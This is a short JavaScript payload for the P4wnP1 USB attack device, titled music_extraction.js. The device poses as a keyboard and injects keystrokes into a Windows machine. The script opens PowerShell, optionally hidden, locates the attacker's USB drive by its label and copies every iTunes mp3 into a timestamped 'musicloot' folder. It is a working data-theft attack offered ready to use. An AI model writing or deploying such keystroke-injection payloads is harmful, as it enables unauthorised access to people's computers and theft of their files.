/*#########################################################################\
# music_extraction.js                                                      #
#   This script will extract all saved music files from iTunes standard    #
#   directory and save them to P4wnP1 (or another specified hard disk).    #
#                                                                          #
#   Author: chriskalv                                                      #
#                                                                          #
# PREREQUISTES:                                                            #
#   - Enable keyboard and USB storage capability on your P4wnP1.           #
\#########################################################################*/


//////////////////// SETTINGS //////////////////\
// GENERAL                                     // ---
layout("de");                                  // Keyboard layout
typingSpeed(0,0);                              // Typing = really fast
hide=false;                                    // Set to true to hide the console window on the target
exit=true;                                     // Set to true to exit the console once finished
copy_to_ssd=false;                             // Set to true to copy to an external SSD instead of P4wnP1 mass storage
var usb_drive = "TEMPUSB"                      // The name of the P4wnP1's USB storage device
var ssd_drive = "SSD"                          // The name of your SSD drive that the music should be copied to instead of the P4wnP1 mass storage
////////////////////////////////////////////////

// Definition of other variables, arrays, ...
var delay_time = 5                             // The time to wait before executing the attack in seconds
var ready = "False"                            // Used to make sure that the attack is ready to be executed

// FUNCTIONS
function attack() {
    press("GUI r");
    delay(600);
    if (hide) type("powershell -w h -NoP -NonI"); else type("powershell");
    press("ENTER")
    delay(1000);

  // Find the P4wnP1 USB drive (or the external ssd), create /musicloot path with current timestamp
    if (copy_to_ssd) {
        type("$usbPath =((gwmi win32_volume -f 'label=''" + ssd_drive + "''').Name);");
    }
    else {
        type("$usbPath =((gwmi win32_volume -f 'label=''" + usb_drive + "''').Name);");
    }
    type("$timestamp = Get-Date -Format '(dd-MM-yyyy_HH-mm)';");
    type("$lootfolder = 'musicloot_' +$timestamp;");
    type("$lootPathItunes = $usbPath+ '' +$lootfolder+ '\\itunes\';mkdir $lootPathItunes;\n");

  // Copy files
    type("Get-ChildItem C:\\Users\\$env:UserName\\Music\\iTunes\\ -Recurse -Include *.mp3 | ForEach-Object ` {copy $_ -Destination $lootPathItunes};\n");

  //Exit the console if chosen to do so      
    if (exit) { type("exit\n"); }
}
function check_if_ready() {
    while (ready = "False") {
        press("SCROLL");                      // Press the 'SCROLL LOCK' button
        result = waitLED(SCROLL,10)           // Wait to see if the 'SCROLL LOCK' has changed for 10ms

        if (result.SCROLL) {                  // The 'SCROLL LOCK' has changed so we must be connected and ready
            ready = "True";                   // Stop the while loop
            break;
        }
    }
}

delay(delay_time * 100);
check_if_ready();
attack();
